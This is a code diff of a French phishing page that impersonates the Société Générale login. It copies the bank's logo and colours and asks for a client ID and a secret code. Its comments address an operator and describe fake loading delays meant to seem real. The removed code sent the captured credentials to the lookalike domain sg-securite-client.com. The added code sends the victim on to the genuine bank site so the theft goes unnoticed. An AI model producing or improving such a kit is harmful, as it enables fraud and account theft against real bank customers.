@@ -2,85 +2,77 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Société Générale - Espace Client</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Société Générale - Connexion</title>
     <style>
         /* RESET ET BASE */
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            font-family: 'Open Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        /* CONTENEUR PRINCIPAL */
-        .login-container {
+            font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background-color: #ffffff;
-            width: 100%;
-            max-width: 400px;
-            padding: 40px 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            color: #000;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* EN-TÊTE AVEC LOGO */
+        .header {
             text-align: center;
-            position: relative;
+            padding-top: 40px;
+            padding-bottom: 20px;
         }
 
-        /* LOGO SG */
         .logo {
-            width: 150px;
+            height: 40px;
+            width: auto;
+            display: inline-block;
+        }
+
+        /* CONTENU PRINCIPAL */
+        .content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 0 20px;
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        h2 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            text-align: center;
+            color: #000;
+        }
+
+        /* CHAMPS DE SAISIE */
+        .input-group {
             margin-bottom: 30px;
-        }
-
-        /* TITRE */
-        h1 {
-            font-size: 22px;
-            color: #000000;
-            margin-bottom: 20px;
-            font-weight: 600;
-        }
-
-        /* CHAMPS DE FORMULAIRE */
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
-            display: none; /* Caché par défaut */
-        }
-
-        .form-group.active {
-            display: block; /* Affiché si classe active */
-            animation: fadeIn 0.5s;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-size: 14px;
-            font-weight: 600;
         }
 
         input[type="number"] {
             width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 16px;
-            transition: border-color 0.3s;
+            padding: 15px 0;
+            border: none;
+            border-bottom: 2px solid #E30613; /* Ligne rouge SG */
+            font-size: 24px;
+            text-align: center;
+            color: #000;
+            background: transparent;
+            outline: none;
             -moz-appearance: textfield;
+            letter-spacing: 2px;
         }
 
-        input[type="number"]:focus {
-            border-color: #E30613; /* Rouge SG */
-            outline: none;
-            box-shadow: 0 0 0 2px rgba(227, 6, 19, 0.2);
+        input[type="number"]::placeholder {
+            color: #999;
+            font-size: 18px;
+            letter-spacing: 1px;
         }
 
         /* Supprimer les flèches haut/bas */
@@ -90,121 +82,127 @@
             margin: 0;
         }
 
-        /* BOUTON CONNEXION (ROUGE) */
-        .btn-login {
+        /* BOUTON PRINCIPAL (ROUGE) */
+        .btn-main {
             width: 100%;
-            padding: 14px;
-            background-color: #E30613; /* Rouge SG officiel */
+            padding: 16px;
+            background-color: #E30613; /* Rouge SG */
             color: white;
             border: none;
             border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
+            font-size: 18px;
+            font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.3s;
-            margin-top: 10px;
-            display: none; /* Caché par défaut */
+            margin-top: auto;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 5px rgba(227, 6, 19, 0.3);
+            transition: background 0.2s;
         }
 
-        .btn-login.active {
-            display: block;
-        }
-
-        .btn-login:hover {
+        .btn-main:active {
             background-color: #c50510;
         }
 
-        /* BOUTON SUIVANT (ÉTAPE 1) */
-        .btn-next {
-            width: 100%;
-            padding: 14px;
-            background-color: #E30613;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
+        /* ÉTAT CACHÉ */
+        .hidden {
+            display: none;
         }
 
-        /* LIENS EN BAS */
-        .links {
-            margin-top: 20px;
-            font-size: 13px;
+        /* ANIMATION DE TRANSITION */
+        .fade-in {
+            animation: fadeIn 0.4s ease-in-out;
         }
 
-        .links a {
-            color: #005699;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* LIENS SECONDAIRES (Bas de page) */
+        .footer-links {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            color: #666;
+            border-top: 1px solid #eee;
+        }
+
+        .footer-links a {
+            color: #E30613;
             text-decoration: none;
             display: block;
             margin-bottom: 8px;
         }
 
-        .links a:hover {
+        .footer-links a:hover {
             text-decoration: underline;
         }
 
-        /* PIED DE PAGE */
-        .footer {
-            margin-top: 30px;
-            font-size: 12px;
+        .help-text {
+            font-size: 13px;
             color: #666;
-            border-top: 1px solid #eee;
-            padding-top: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.4;
         }
 
-        /* CHARGEMENT */
-        .loader {
-            display: none;
-            margin: 20px auto;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #E30613;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .help-link {
+            color: #E30613;
+            text-decoration: none;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
 
-    <div class="login-container">
-        <!-- LOGO SG -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ea/Logo_Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_2017.svg" alt="Société Générale Logo" class="logo">
+    <!-- EN-TÊTE -->
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ea/Logo_Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_2017.svg" alt="SG" class="logo">
+    </div>
 
-        <h1>Connexion</h1>
-
+    <!-- CONTENU DYNAMIQUE -->
+    <div class="content">
+        
         <!-- ÉTAPE 1 : IDENTIFIANT -->
-        <div id="step1" class="form-group active">
-            <label for="client_id">Identifiant (Chiffres)</label>
-            <input type="number" id="client_id" name="client_id" placeholder="Ex: 12345678" required>
-            <button type="button" class="btn-next" onclick="goToStep2()">Suivant</button>
+        <div id="step1" class="fade-in">
+            <h2>Saisissez votre Identifiant Client</h2>
+            
+            <div class="input-group">
+                <input type="number" id="client_id" placeholder="Ex: 12345678" inputmode="numeric" pattern="[0-9]*">
+            </div>
+
+            <p class="help-text">
+                <a href="#" class="help-link">Où trouver mon Code Client SG ?</a>
+            </p>
+
+            <button class="btn-main" onclick="goToStep2()">Suivant</button>
         </div>
 
-        <!-- CHARGEMENT (Optionnel, pour faire croire que ça vérifie) -->
-        <div id="loader" class="loader"></div>
+        <!-- ÉTAPE 2 : CODE SECRET (MOT DE PASSE) -->
+        <div id="step2" class="hidden">
+            <h2>Saisissez votre Code Secret</h2>
+            
+            <div class="input-group">
+                <input type="number" id="password" placeholder="Ex: 12345" inputmode="numeric" pattern="[0-9]*">
+            </div>
 
-        <!-- ÉTAPE 2 : MOT DE PASSE -->
-        <div id="step2" class="form-group">
-            <label for="password">Mot de passe (Chiffres)</label>
-            <input type="number" id="password" name="password" placeholder="Ex: 12345" required>
-            <button type="submit" class="btn-login active" onclick="submitForm()">Se connecter</button>
+            <p class="help-text">
+                <a href="#" class="help-link">Code Secret inconnu ?</a>
+            </p>
+
+            <button class="btn-main" onclick="submitForm()">Valider</button>
         </div>
 
-        <div class="links">
-            <a href="#">Mot de passe oublié ?</a>
-            <a href="#">Première connexion</a>
-        </div>
+    </div>
 
-        <div class="footer">
-            <p>&copy; 2026 Société Générale. Tous droits réservés.</p>
-        </div>
+    <!-- PIED DE PAGE -->
+    <div class="footer-links">
+        <a href="#">Urgences carte bancaire</a>
+        <a href="#">Nos conseils sécurité</a>
+        <a href="#">Questions fréquentes</a>
+        <a href="#">Trouver une agence</a>
+        <br>
+        <span style="font-size: 12px; color: #999;">© 2026 Société Générale</span>
     </div>
 
     <script>
@@ -212,25 +210,22 @@
             const idInput = document.getElementById('client_id');
             const step1 = document.getElementById('step1');
             const step2 = document.getElementById('step2');
-            const loader = document.getElementById('loader');
 
             if (idInput.value.length < 1) {
-                idInput.style.borderColor = '#E30613';
+                idInput.style.borderBottomColor = '#ff0000';
+                setTimeout(() => idInput.style.borderBottomColor = '#E30613', 300);
                 return;
             }
 
-            // Cacher étape 1
-            step1.classList.remove('active');
+            step1.style.opacity = '0';
+            step1.style.transform = 'translateY(-10px)';
             
-            // Montrer le chargement pendant 1 seconde (pour faire réaliste)
-            loader.style.display = 'block';
-
             setTimeout(() => {
-                loader.style.display = 'none';
-                step2.classList.add('active');
-                // Mettre le focus sur le champ mot de passe
+                step1.classList.add('hidden');
+                step2.classList.remove('hidden');
+                step2.classList.add('fade-in');
                 document.getElementById('password').focus();
-            }, 800); // 800ms de délai
+            }, 300);
         }
 
         function submitForm() {
@@ -239,14 +234,15 @@
             const clientId = document.getElementById('client_id').value;
 
             if (password.length < 1) {
-                passwordInput.style.borderColor = '#E30613';
+                passwordInput.style.borderBottomColor = '#ff0000';
+                setTimeout(() => passwordInput.style.borderBottomColor = '#E30613', 300);
                 return;
             }
 
-            // Redirection vers ta page de capture ou ton site
-            // Ici, on redirige vers la même page avec les paramètres dans l'URL
-            // Tu pourras récupérer ces données si tu ajoutes un script de capture plus tard
-            window.location.href = "https://sg-securite-client.com?client_id=" + clientId + "&password=" + password;
+            // 🎯 REDIRECTION VERS LE VRAI SITE SG
+            // On envoie l'utilisateur vers l'espace client officiel pour qu'il croie que tout est normal.
+            // Tu peux aussi mettre https://www.societegenerale.com si tu veux.
+            window.location.href = "https://espace-client.societegenerale.com";
         }
     </script>
 
